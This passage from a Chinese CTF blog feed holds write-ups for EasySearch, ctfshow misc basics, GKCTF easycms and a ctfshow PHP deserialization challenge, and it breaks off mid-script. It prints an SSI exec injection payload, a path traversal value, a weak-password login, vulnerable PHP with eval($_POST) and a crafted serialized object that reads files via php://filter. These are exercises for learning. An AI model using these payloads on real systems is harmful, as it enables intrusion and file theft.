class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析一下，很明显，我们首先需要获得密码，密码md5加密后前六位为：<code>6d0bc1</code></p><p>我们可以爆破得出密码，使用python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>admin = <span class="hljs-string">&quot;6d0bc1&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    passwd = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="hljs-number">6</span>]<br>    <span class="hljs-keyword">if</span> admin == passwd:<br>        <span class="hljs-built_in">print</span>(i)<br>        <br> 输出：<br><span class="hljs-number">2020666</span><br></code></pre></td></tr></table></figure><p>所以我们就知道密码为：2020666</p><p>但是这里我们怎么才能得到flag呢？这里会将用户名给传入文件中，但是并不是普通的文件，而是<code>.shtml</code> 文件</p><p>这里有个知识点，<code>Apache SSI远程命令执行漏洞</code></p><blockquote><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p></blockquote><p>意思就是，如果服务器端开启了SSI功能，我们可以通过相关的SSI写法(写在html注释中)将命令代码写入shtml文件中，然后代码执行的话就可以进行命令执行了</p><p>我们可以使用exec命令查询flag所在位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br></code></pre></td></tr></table></figure><p>当我们username:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br></code></pre></td></tr></table></figure><p>返回url：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span>/<span class="hljs-number">653573535</span>b44403d59e8971929e98dc2ab4dd611.shtml<br></code></pre></td></tr></table></figure><p>我们访问它</p><p><img src="https://s2.loli.net/2023/03/15/VBnPGkJD1OwtqHK.png" alt="image-20230315225754176"></p><p>flag就在这个文件里面</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EasySearch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow入门</title>
    <link href="/2023/08/24/ctfshow%E5%85%A5%E9%97%A8/"/>
    <url>/2023/08/24/ctfshow%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow【misc】入门"><a href="#ctfshow【misc】入门" class="headerlink" title="ctfshow【misc】入门"></a>ctfshow【misc】入门</h2><h3 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h3><h4 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h4><p>直接给flag</p><h4 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h4><p>把txt后缀改为png</p><h4 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h4><p>打开bpg图片得flag</p><h4 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h4><h5 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JPEG</span> (jpg) 文件头：FF D8 FF  文件尾：FF D9<br><br><span class="hljs-attribute">PNG</span> (png)，文件头：<span class="hljs-number">89504</span>E47<br><br><span class="hljs-attribute">Windows</span> Bitmap (bmp)， 文件头：<span class="hljs-number">424</span>D 文件尾：<br><br><span class="hljs-attribute">GIF</span> (gif)，文件头：<span class="hljs-number">47494638</span><br><br><span class="hljs-attribute">XML</span> (xml)，文件头：<span class="hljs-number">3</span>C3F786D6C<br><br><span class="hljs-attribute">HTML</span> (html)，文件头：<span class="hljs-number">68746</span>D6C3E<br><br><span class="hljs-attribute">MS</span> Word/Excel (xls.or.doc)，文件头：D0CF11E0<br><br><span class="hljs-attribute">MS</span> Access (mdb)，文件头：<span class="hljs-number">5374616</span>E64617264204A<br><br><span class="hljs-attribute">Adobe</span> Acrobat (pdf)，文件头：<span class="hljs-number">255044462</span>D312E<br><br><span class="hljs-attribute">Windows</span> Password (pwl)，文件头：E3828596<br><br><span class="hljs-attribute">ZIP</span> Archive (zip)，文件头：<span class="hljs-number">504</span>B0304<br><br><span class="hljs-attribute">RAR</span> Archive (rar)，文件头：<span class="hljs-number">52617221</span><br><br><span class="hljs-attribute">Wave</span> (wav)，文件头：<span class="hljs-number">57415645</span><br><br><span class="hljs-attribute">AVI</span> (avi)，文件头：<span class="hljs-number">41564920</span><br><br><span class="hljs-attribute">TIFF</span> (tif)， 文件头：<span class="hljs-number">49492</span>A00 文件尾：<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/14/XAc5WLeyqC6FjuP.png" alt="在这里插入图片描述"></p><h4 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h4><p>010打开，flag在最后</p><h4 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h4><p><img src="https://s2.loli.net/2023/03/14/lbDe25aKXWIkHCr.png" alt="image-20230314110254598"></p><h4 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h4><p>同上</p><h4 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h4><p>使用foremost分离出flag图片</p><h4 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h4><p><img src="https://s2.loli.net/2023/03/14/8InGa1YVO6cvSqu.png" alt="image-20230314110744993"></p><h4 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h4><p>binwalk分离一下得到flag</p><h4 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h4><p>使用010观察，发现有两个IDAT数据块，并且后面一个数据块的长度更长</p><p>这里我们需要使用一个新的工具： <code>TweakPNG</code> 可以很方便查看png详细数据，并且进行修改</p><p><img src="https://s2.loli.net/2023/03/14/qHyTpJwL5fP2m9R.png" alt="image-20230314112455888"></p><p>我们需要把第一个IDAT删除，然后保存，得到flag</p><h4 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h4><p>使用<code>tweakPNG</code>，删除前八个IDAT数据块得到flag：</p><img src="https://s2.loli.net/2023/03/28/apPeTrcMIoKzHkU.png" alt="image-20230328101606392" style="zoom: 67%;" /><h4 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h4><p><img src="https://s2.loli.net/2023/03/28/3uTKI45hXdaNPcS.png" alt="image-20230328101956337"></p><p>misc14</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>easycms</title>
    <link href="/2023/08/24/easycms/"/>
    <url>/2023/08/24/easycms/</url>
    
    <content type="html"><![CDATA[<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><blockquote><p>后台密码5位弱口令</p></blockquote><p>进去发现是蝉知cms，并且版本是7.7</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142240994.png" alt="image-20230414224008907"></p><p>网上搜一下发现<code>蝉知cms7.7命令执行漏洞</code></p><p>扫描可以知道<code>admin.php</code>，是一个登录页面，密码提示5位弱密码。</p><p>于是我们猜测，账号:admin，密码:12345，成功登录。</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142243221.png" alt="image-20230414224340099"></p><p>然后我们找到：<code>设计-&gt;高级</code></p><p>我们写入命令执行代码，发现不能保存：（记住这个文件名）</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142245535.png" alt="image-20230414224515500" style="zoom:33%;" /><p>我们进入：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142245355.png" alt="image-20230414224554279" style="zoom: 33%;" /><p>先随便注册一个公众号：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142246123.png" alt="image-20230414224637051" style="zoom: 33%;" /><p>然后我们按照规则注册第二个公众号：</p><p>在原始ID这里进行输入<code>../../../system/tmp/wvlx.txt/0</code>最后那个txt名称为之前修改模板提示的文件</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142254771.png" alt="image-20230414225443686" style="zoom:33%;" /><p>然后我们就可以插入命令执行代码了，直接读flag</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142253394.png" alt="image-20230414225340308" style="zoom:33%;" /><p>当然还有其他的做法，文件上传等等</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>easycms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_愚人杯</title>
    <link href="/2023/08/24/ctfshow_%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
    <url>/2023/08/24/ctfshow_%E6%84%9A%E4%BA%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow【愚人杯】"><a href="#ctfshow【愚人杯】" class="headerlink" title="ctfshow【愚人杯】"></a>ctfshow【愚人杯】</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h4><p>打开发现：url</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://b96d3820-fc5d-<span class="hljs-number">4</span>c61-<span class="hljs-number">9007</span>-<span class="hljs-number">68</span>ae2b60a743.challenge.ctf.show/?img=aW5kZXgucGhw<br></code></pre></td></tr></table></figure><p>img参数被base64编码，解码后发现是<code>face.png</code></p><p>于是我们想到，可以将index.php进行base64编码，使用get传参</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032324899.png" alt="image-20230403232405829"></p><p>图片路径base64解压得到flag</p><h4 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># 当前目录中有一个txt文件哦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不行哦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>我们观察到：<code>$_SERVER[&quot;HTTP_AAAAAA&quot;]</code> ，意思是我们需要在header头中传入名为<code>AAAAAA</code>的头，进行传参</p><p>首先我们看到类 <code>cycycycy</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以进行代码执行，但是我们并不知道<code>cipher()</code>函数是什么，并且需要使get传参后的值经过cipher加密后为：<code>p8vfuv8g8v8py</code>，<code>cipher()</code>应该是在<code>check.php</code>中</p><p>然后我们注意到类 <code>w_wuw_w</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里存在文件包含漏洞，于是我们想要去读取<code>check.php</code>，构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span>-&gt;file = <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;aaa=&amp;<span class="hljs-variable">$a</span>-&gt;key;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>输出：<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;w_wuw_w&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;aaa&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;R:<span class="hljs-number">2</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">53</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这里我们让 <code>$aaa</code>去指向<code>$key</code>的那片内存空间，这样我们就能通过$aaa去输出读取到的文件内容了，</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304081701840.png" alt="image-20230408170131757"></p><p>base64解密，得到<code>check.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cipher</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)&gt;<span class="hljs-number">10000</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$charset</span> = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;<br>    <span class="hljs-variable">$shift</span> = <span class="hljs-number">4</span>;<br>    <span class="hljs-variable">$shifted</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$char</span> = <span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$charset</span>, <span class="hljs-variable">$char</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$new_pos</span> = (<span class="hljs-variable">$pos</span> - <span class="hljs-variable">$shift</span> + <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$charset</span>)) % <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$charset</span>);<br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$charset</span>[<span class="hljs-variable">$new_pos</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$char</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$shifted</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里定义了 <code>cipher()</code>函数，我们写一个解密脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uncipher</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span 